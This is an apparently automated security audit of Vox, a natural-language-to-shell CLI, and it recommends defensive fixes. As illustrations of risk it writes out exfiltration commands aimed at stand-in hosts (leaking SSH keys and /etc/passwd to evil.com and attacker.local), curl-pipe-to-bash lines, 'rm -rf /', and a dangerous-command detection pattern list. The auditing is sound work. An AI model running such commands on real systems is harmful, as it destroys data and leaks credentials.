# Vox CLI — QA & Security Report

**Date:** 2026-03-11
**Scope:** `src/vox/cli.py`, `src/vox/engine.py`, `install.sh`, `uninstall.sh`
**Reviewer:** Atlas (Principal Engineer, automated static analysis)
**Version audited:** 0.1.0

---

## Executive Summary

Vox is a clean, minimal NL-to-shell CLI. The codebase is well-structured and surprisingly safe by default — commands always show a confirmation prompt in the standard path. However, several issues exist that range from dangerous (the `--execute` / `!` passthrough) to missing-but-expected (no history, no config file). The most critical risks are concentrated in two areas: the `shell=True` subprocess call and the `--execute` flag combined with an AI model that has no output constraints at the execution layer.

---

## CRITICAL Issues

### C-1: `shell=True` with Unsanitized AI Output — Command Injection via Model Response

**File:** `src/vox/cli.py` line 30
**Code:**
```python
result = subprocess.run(cmd, shell=True, check=False)
```

**Risk:** `shell=True` passes the entire `cmd` string to `/bin/sh -c`. If the Ollama model returns a response containing shell metacharacters — either through a jailbroken model, a misconfigured model, or a malicious Ollama server — the shell will interpret them. There is no sanitization layer between `clean_response()` output and `subprocess.run`.

**Attack scenario:**
1. An attacker runs a local Ollama-compatible server at a custom port (or MITMs localhost).
2. They configure vox with `vox --api http://attacker.local:11434`.
3. Their server returns: `ls -la; curl http://attacker.local/exfil?data=$(cat ~/.ssh/id_rsa | base64)`
4. If the user runs with `--execute` or confirms at the prompt, the injected command runs.
5. Even without `--execute`, the command is *displayed* with syntax highlighting — the user may not notice the semicolon-separated payload buried in a long command.

**Specific dangerous patterns a model could return:**
- `rm -rf /` or `rm -rf ~`
- `$(curl http://evil.com/payload | bash)`
- `` `curl http://evil.com/payload | bash` ``
- `cmd1 && rm -rf /home/user`
- `cmd1; curl -d @/etc/passwd http://evil.com`

**Fix:** Replace `shell=True` with `shell=False` using `shlex.split()` for simple single commands. For commands that genuinely need shell features (pipes, redirects), consider a warning at display time. At minimum, implement a blocklist/allowlist heuristic that flags dangerous patterns before execution — not as a security guarantee, but as a last-resort safety net.

```python
import shlex

def execute_command(cmd: str) -> int:
    try:
        # Try shell=False first for safety
        args = shlex.split(cmd)
        result = subprocess.run(args, check=False)
        return result.returncode
    except ValueError:
        # Fall back to shell=True for complex commands (pipes, etc.)
        # but warn the user
        console.print("  [yellow]Note: complex command requires shell execution[/yellow]")
        result = subprocess.run(cmd, shell=True, check=False)
        return result.returncode
    except KeyboardInterrupt:
        console.print("\n[dim][interrupted][/dim]")
        return 130
```

Note: `shell=False` alone does not prevent a destructive command like `rm -rf /` — the user can still confirm it. The real fix is C-2 below.

---

### C-2: `--execute` / `-x` Flag Auto-Runs Without Any Review

**File:** `src/vox/cli.py` lines 75–79
**Code:**
```python
if auto_execute:
    rc = execute_command(cmd)
    if rc != 0:
        console.print(f"  [dim]exit {rc}[/dim]")
    console.print()
    return
```

**Risk:** `--execute` bypasses the only safety gate in the entire application. The user sees the command for a fraction of a second (syntax-highlighted) and it runs. There is no:
- Dangerous command detection (destructive flags like `-rf`, `--force`, `sudo`, `dd`)
- Dry-run option
- Undo mechanism
- Timeout or cancellation window

**Scenario:** `vox -x "clean up my home directory"` — the model returns `rm -rf ~`. It runs immediately. There is no recovery.

**Fix (short-term):** Add a dangerous-command detector that forces manual confirmation even with `--execute`:

```python
DANGEROUS_PATTERNS = [
    r"\brm\s+(-\w*f\w*|-\w*r\w*){1,2}\s",  # rm -rf / rm -fr
    r"\bdd\b",                                # dd if=...
    r"\bmkfs\b",                              # format filesystem
    r"\b:(){ :|:& };:\b",                    # fork bomb
    r"\bsudo\b",                              # privilege escalation
    r"\bchmod\s+[0-7]*7[0-7]*\s+/",         # world-write on root paths
    r"\bshred\b",
    r"\bwipe\b",
]

def is_dangerous(cmd: str) -> bool:
    return any(re.search(p, cmd) for p in DANGEROUS_PATTERNS)
```

**Fix (long-term):** Remove `--execute` entirely or require a second flag `--execute --i-understand-the-risks`. Auto-execution of AI-generated commands is a product-level decision that needs deliberate opt-in.

---

### C-3: REPL `!` Passthrough Runs Arbitrary Commands Without Confirmation

**File:** `src/vox/cli.py` lines 132–135
**Code:**
```python
if query.startswith("!"):
    # Raw command pass-through
    execute_command(query[1:].strip())
    console.print()
    continue
```

**Risk:** The `!` passthrough calls `execute_command()` which uses `shell=True`. The user typed it, so it is intentional — but there is still no confirmation step. More critically, because `shell=True` is used, if the user pastes a command containing shell injection (e.g., copied from a web page), there is no review barrier. The feature also undocumented in `--help` output.

**Risk level:** Lower than C-1 because it is user-initiated input, not AI output. Still worth addressing.

**Fix:** Show the command and prompt for confirmation (same `prompt_action()` flow), or at minimum add `console.print(f"  [dim]Running: {query[1:]}[/dim]")` so there is a visual record before execution.

---

## HIGH Issues

### H-1: No Length Limit on Ollama Response — Denial of Service / Display Corruption

**File:** `src/vox/engine.py` line 68–70
**Code:**
```python
"options": {
    "temperature": 0.1,
    "num_predict": 256,
},
```

`num_predict: 256` limits token generation, but a token is not a character. A 256-token response could be ~1,500 characters. More importantly, `clean_response()` does not enforce a hard character limit. If the model returns 256 tokens of valid-looking bash (e.g., a heredoc with embedded data), the entire string is passed to `subprocess.run(cmd, shell=True)` which the shell will happily execute.

**Additional risk:** A multiline command (model returns `cmd1\ncmd2\ncmd3`) is passed verbatim to `shell=True`. All lines execute. The user only reviewed line 1 in the confirmation prompt — `print_command()` displays the whole thing, but the confirmation prompt just says "Run it? [Y/n/c]" with no per-line breakdown.

**Fix:**
1. Add a hard character limit in `clean_response()`: `if len(text) > 500: return None`
2. For multiline responses, either take only the first line or explicitly warn: "This is a multi-line script. Are you sure?"
3. Consider rejecting any response that contains a newline in non-`--execute` mode.

---

### H-2: `VOX_API_URL` Environment Variable Accepts Arbitrary URLs — SSRF

**File:** `src/vox/engine.py` lines 25–27
**Code:**
```python
def get_api_url() -> str:
    return os.environ.get("VOX_API_URL", DEFAULT_API_URL)
```

And `src/vox/cli.py` line 174:
```python
if args.api:
    os.environ["VOX_API_URL"] = args.api
```

**Risk:** The API URL is fully user-controlled with no validation. Combined with `httpx.post()`, this enables SSRF (Server-Side Request Forgery) in environments where vox runs with elevated network access. An attacker who can set the environment variable (e.g., via a `.env` file in a compromised repo, a CI/CD pipeline injection) can redirect vox's HTTP requests to internal services.

More practically: `vox --api http://169.254.169.254/` on AWS would query the EC2 metadata endpoint. The response would fail JSON parsing and be a no-op for command execution, but it is still unintended network traffic.

**Fix:** Validate that `VOX_API_URL` starts with `http://localhost` or `http://127.0.0.1` or `http://[::1]` unless an explicit `--allow-remote-api` flag is passed. Add a warning when using non-localhost URLs.

---

### H-3: Malicious Ollama Server Can Inject Commands (Indirect Prompt Injection)

**File:** `src/vox/engine.py` lines 82–84
**Code:**
```python
raw = data.get("message", {}).get("content", "")
cmd = clean_response(raw)
return cmd if cmd else None
```

**Risk:** `clean_response()` strips markdown and prompt characters but does nothing to prevent the model from returning shell metacharacters. A malicious Ollama server (or a jailbroken local model) can return any string it wants. The `clean_response()` function would pass `; curl http://exfil.example.com/$(whoami)` directly to `execute_command()`.

This is the "prompt injection via model output" vector. The model itself is the untrusted surface.

**Fix:** After `clean_response()`, apply a secondary sanitization pass that detects and warns about:
- Multiple commands (`;`, `&&`, `||`, `|`, newlines)
- Command substitution (`$()`, backticks)
- Subshells (`(...)`)
- Heredocs (`<<`)

These do not need to be blocked outright (pipes are legitimate shell commands), but they should trigger a more prominent warning in the confirmation UI, such as: `[yellow]Warning: this command contains pipes/substitutions — review carefully.[/yellow]`

---

### H-4: No Validation That Response Is Actually a Shell Command

**File:** `src/vox/engine.py` lines 40–53

**Risk:** If the model returns a Python script, a JSON blob, a prose explanation, or an error message, `clean_response()` will strip the markdown fences and return the raw content as if it were a shell command. The user would see a multi-line Python script with a "Run it? [Y/n/c]" prompt. If they press Enter out of habit, `subprocess.run(python_code_string, shell=True)` executes it.

**Example:** Model returns:
```
Here is a Python script to do that:
import os
os.system("rm -rf /")
```
After `clean_response()`: `import os\nos.system("rm -rf /")`
Result: `subprocess.run("import os\nos.system('rm -rf /')", shell=True)` — bash will fail on `import` but the intent is alarming.

**Fix:** Add a basic heuristic: if the cleaned response contains `import `, `def `, `class `, `print(`, `<?php`, `<html`, or similar non-shell tokens, return `None` and print "Response did not look like a shell command." Also enforce single-line output by default and require `--multiline` to execute multi-line responses.

---

## MEDIUM Issues

### M-1: Empty Input Handling Is Fine, But Whitespace-Only Input Is Silently Skipped

**File:** `src/vox/cli.py` line 124
**Code:** `if not query: continue`

`.strip()` is called on line 119, so whitespace-only input becomes `""` and is silently skipped. This is correct behavior. No issue here beyond noting that a query of just `" "` (spaces) does silently continue with no feedback — acceptable but could show a dim hint.

---

### M-2: Very Long Input (10,000 chars) Sent Directly to Ollama With No Truncation

**File:** `src/vox/engine.py` lines 62–73

There is no input length check. A 10,000-character query is sent verbatim to Ollama's `/api/chat` endpoint. This can:
1. Cause the request to fail with a 413 or timeout
2. Slow down the model significantly
3. Potentially trigger unexpected model behavior

**Fix:** Truncate or reject inputs over a reasonable limit (e.g., 500 characters) with a user-friendly message:
```python
MAX_QUERY_LEN = 500
if len(query) > MAX_QUERY_LEN:
    console.print(f"  [yellow]Query too long ({len(query)} chars, max {MAX_QUERY_LEN}). Try a shorter description.[/yellow]")
    return None
```

---

### M-3: Unicode and Emoji in Queries — No Issue with API, Potential Display Issue

Unicode and emoji pass through correctly because Python 3 strings are Unicode-native and `httpx` handles UTF-8 encoding. Rich handles Unicode display well. The only edge case is emoji in the translated command itself — `subprocess.run("echo 🔥", shell=True)` works on macOS but may fail on some Linux locales without `LANG=en_US.UTF-8`. No code change required, but document the locale dependency.

---

### M-4: Timeout Is 30 Seconds — No User Feedback During Wait

**File:** `src/vox/engine.py` line 79
```python
response = httpx.post(..., timeout=30.0)
```

If Ollama is slow (loaded model, resource-constrained), the user sees a blank prompt for up to 30 seconds with no spinner, progress indicator, or cancellation option. This is a UX issue that becomes a security issue if users give up and CTRL+C — the `KeyboardInterrupt` is not caught in `translate()`, only in `execute_command()`. An unhandled `KeyboardInterrupt` in `translate()` would propagate up through `handle_command()` and crash the REPL with a Python traceback, leaking internal state.

**Fix:**
1. Add a `try/except KeyboardInterrupt` around the `httpx.post()` call in `translate()`.
2. Use `rich.console.Console().status()` as a spinner during translation.
3. Reduce the default timeout to 15s and make it configurable.

---

### M-5: `check_ollama()` Uses Substring Matching — Model Name Collision

**File:** `src/vox/engine.py` lines 118–119
```python
return any(model in m for m in models)
```

If the configured model is `nl2shell` and the user has `nl2shell-v2` installed, this returns `True` even though `nl2shell` itself is not present (because `"nl2shell" in "nl2shell-v2"` is `True`). This causes misleading "model ready" messages and could cause the actual API call to fail with a 404 later.

**Fix:** Use exact match or prefix-with-colon match:
```python
return any(m == model or m.startswith(f"{model}:") for m in models)
```

---

### M-6: No CTRL+C Handler in Translate — Traceback Leaks on Interrupt

**File:** `src/vox/engine.py` lines 75–108

If the user presses CTRL+C while `httpx.post()` is in-flight, Python raises `KeyboardInterrupt`. This is not caught in `translate()`. It propagates through `handle_command()` in `cli.py` which also doesn't catch it, and surfaces as a Python traceback in the REPL. The REPL's outer loop at line 117–138 does catch `KeyboardInterrupt` at the `console.input()` line, but not during the `handle_command(query)` call on line 138.

**Fix:** Wrap `handle_command(query)` in the REPL loop with a `try/except KeyboardInterrupt`.

---

### M-7: install.sh — No Integrity Verification of Fetched Code

**File:** `install.sh` lines 40–46

The script fetches and installs code directly from GitHub over HTTPS with no hash pinning or signature verification:
```bash
pipx install "git+${REPO}" --force
```

**Risk:** If the GitHub repository is compromised (account takeover, supply chain attack), the install script installs malicious code. This is standard practice for one-liner installers but worth documenting as a known risk.

**Fix:** Pin to a specific commit SHA in the install script, or provide a `--version` flag that installs from a PyPI release (where releases have checksums). Consider adding a `curl | sha256sum` verification step before install.

---

### M-8: install.sh — Silent Failure Swallowed by `2>/dev/null`

**File:** `install.sh` lines 40–46
```bash
pipx install "git+${REPO}" --force 2>/dev/null && INSTALLED=1 || INSTALLED=0
```

All stderr from `pipx`/`uv`/`pip` is suppressed. If installation fails due to a network error, missing git, Python version mismatch, or dependency conflict, the user only sees "Installation failed. Try manually:" with no diagnostic information.

**Fix:** Remove `2>/dev/null` and let errors print. Alternatively, capture stderr to a temp file and display it only on failure.

---

### M-9: Concurrent REPL Sessions — No Lock File, State Pollution via Environment Variables

Multiple concurrent `vox` REPL sessions on the same machine share the Ollama server and can set `VOX_MODEL` / `VOX_API_URL` via `os.environ` in one session (from the CLI args). Because environment changes are process-local, this is not a shared-state problem. However, if a user sources vox or if subprocesses inherit the environment, the overridden `VOX_MODEL` could affect child processes. Low practical risk; document that `--model` and `--api` are session-scoped.

---

## LOW Issues (Future Enhancements)

### L-1: No Command History in REPL

The REPL uses `console.input()` from Rich, which does not provide readline history (up-arrow). Users cannot navigate previous queries. This is a significant UX gap for a REPL tool.

**Fix:** Use Python's `readline` module or `prompt_toolkit` for history-aware input. Persist history to `~/.local/share/vox/history` (XDG-compliant).

---

### L-2: No Configuration File

There is no `~/.config/vox/config.toml` or equivalent. Model name, API URL, confirmation behavior, and timeout are only configurable via environment variables or CLI flags — not persistent.

**Fix:** Add config file support using `platformdirs` for XDG-compliant paths. Suggested schema:
```toml
[model]
name = "nl2shell"
api_url = "http://localhost:11434"
timeout = 30

[behavior]
auto_execute = false
confirm_dangerous = true
max_query_length = 500
```

---

### L-3: No Shell Completion

No bash/zsh/fish completion scripts are provided. The `--model` flag in particular would benefit from dynamic completion that queries `ollama list`.

**Fix:** Add completion scripts in `completions/` directory and register them in `pyproject.toml`. Tools like `argcomplete` can auto-generate completions from `argparse` definitions.

---

### L-4: No Debug / Verbose Mode

There is no `--debug` or `--verbose` flag. When translation fails, users cannot inspect the raw API payload or response. This makes debugging model behavior difficult.

**Fix:** Add `--debug` flag that prints the full request payload, raw response, and clean_response output to stderr.

---

### L-5: No Rate Limiting

In the REPL, a user (or a script) can send queries in rapid succession, hammering the Ollama API indefinitely. While Ollama is local, this could saturate GPU resources.

**Fix:** Implement a simple token bucket or minimum inter-request delay (e.g., 200ms) in the REPL loop.

---

### L-6: No Offline / Graceful Degradation Mode

When Ollama is unavailable, `translate()` prints to stderr and returns `None`. The REPL shows a warning at startup but continues running. There is no fallback behavior — no cached responses, no offline command lookup, no helpful suggestions.

**Fix:** Add an optional fuzzy-match fallback against a small built-in command dictionary for common queries ("list files", "show disk usage", etc.). This gives the tool value even without a running model.

---

### L-7: Piped Input Mode — Behavior Undocumented

`echo "list files" | vox` works because `console.input()` in non-interactive mode reads from stdin. However:
1. The REPL banner and "vox >" prompt are printed to the terminal even in piped mode.
2. There is no `--quiet` / `-q` flag to suppress decorative output for scripting use.
3. `EOFError` from the piped input terminates the loop gracefully (correct), but multi-line piped input processes each line as a separate query.

**Fix:** Detect `not sys.stdin.isatty()` at startup and enter a minimal non-interactive mode that suppresses the REPL banner and prints only the translated command to stdout.

---

### L-8: pyproject.toml Suppresses Security-Relevant Linting Rules

**File:** `pyproject.toml` lines 47
```toml
ignore = ["T201", "S101", "S602", "S603", "S607", "E501", "S108"]
```

Specifically suppressed:
- `S602` — `subprocess` call with `shell=True` (this is the exact vulnerability in C-1)
- `S603` — `subprocess` call with untrusted input
- `S607` — Starting a process with a partial executable path

These rules were suppressed presumably to silence the linter, but they are directly relevant to the security issues identified in this report. Re-enabling them would have flagged C-1 automatically.

**Fix:** Remove `S602`, `S603`, `S607` from the ignore list. Address the underlying linter warnings by fixing the `shell=True` usage rather than silencing the warning.

---

## Issue Summary

| ID  | Severity | Title                                                          | File           |
|-----|----------|----------------------------------------------------------------|----------------|
| C-1 | CRITICAL | `shell=True` with unsanitized AI output — command injection    | cli.py:30      |
| C-2 | CRITICAL | `--execute` auto-runs without dangerous-command detection      | cli.py:75-79   |
| C-3 | CRITICAL | REPL `!` passthrough runs without confirmation via `shell=True`| cli.py:132-135 |
| H-1 | HIGH     | No multiline command guard — all lines execute silently        | engine.py      |
| H-2 | HIGH     | `VOX_API_URL` accepts arbitrary URLs — SSRF                    | engine.py:26   |
| H-3 | HIGH     | Malicious Ollama server can inject commands via response       | engine.py:83   |
| H-4 | HIGH     | No validation that response is a shell command vs. a script    | engine.py      |
| M-1 | MEDIUM   | Whitespace-only input silently skipped (acceptable, minor)     | cli.py:124     |
| M-2 | MEDIUM   | No input length limit — 10k-char queries sent to Ollama        | engine.py      |
| M-3 | MEDIUM   | Unicode/emoji locale dependency undocumented                   | engine.py      |
| M-4 | MEDIUM   | 30s timeout with no spinner or CTRL+C handling in translate()  | engine.py:79   |
| M-5 | MEDIUM   | Model name substring matching causes false positives           | engine.py:119  |
| M-6 | MEDIUM   | CTRL+C during translation leaks traceback in REPL              | engine.py      |
| M-7 | MEDIUM   | install.sh — no integrity verification of fetched code         | install.sh     |
| M-8 | MEDIUM   | install.sh — silent failure hides diagnostic errors            | install.sh     |
| M-9 | MEDIUM   | Concurrent sessions — environment variable scope (low impact)  | cli.py         |
| L-1 | LOW      | No command history (up-arrow) in REPL                          | cli.py         |
| L-2 | LOW      | No persistent config file                                      | —              |
| L-3 | LOW      | No shell completion scripts                                    | —              |
| L-4 | LOW      | No debug/verbose mode                                          | cli.py         |
| L-5 | LOW      | No rate limiting in REPL                                       | cli.py         |
| L-6 | LOW      | No offline/graceful degradation mode                           | engine.py      |
| L-7 | LOW      | Piped input mode undocumented and unpolished                   | cli.py         |
| L-8 | LOW      | pyproject.toml suppresses S602/S603/S607 security rules        | pyproject.toml |

---

## Recommended Fix Priority

**Before any public release:**

1. Fix C-1: Replace `shell=True` with `shlex.split()` + `shell=False` for simple commands; add multiline detection.
2. Fix C-2: Add dangerous-command pattern detection that blocks auto-execution even with `--execute`.
3. Fix H-4: Add heuristic check that response looks like a shell command (no `import`, `def`, etc.).
4. Fix L-8: Re-enable `S602`/`S603`/`S607` linting rules to prevent regressions.

**Before any production usage:**

5. Fix H-2: Validate `VOX_API_URL` is localhost unless explicitly overridden.
6. Fix H-1: Reject/warn on multiline model responses; enforce single-command output.
7. Fix M-4: Add `KeyboardInterrupt` handling in `translate()` and a spinner for slow responses.
8. Fix M-6: Wrap `handle_command()` in the REPL loop with `try/except KeyboardInterrupt`.

**Nice-to-have for v1.0:**

9. L-1: Add readline history.
10. L-2: Add config file support.
11. M-8: Remove `2>/dev/null` from install.sh.
12. M-5: Fix model name exact matching in `check_ollama()`.

---

*Report generated by static analysis. No files were modified.*
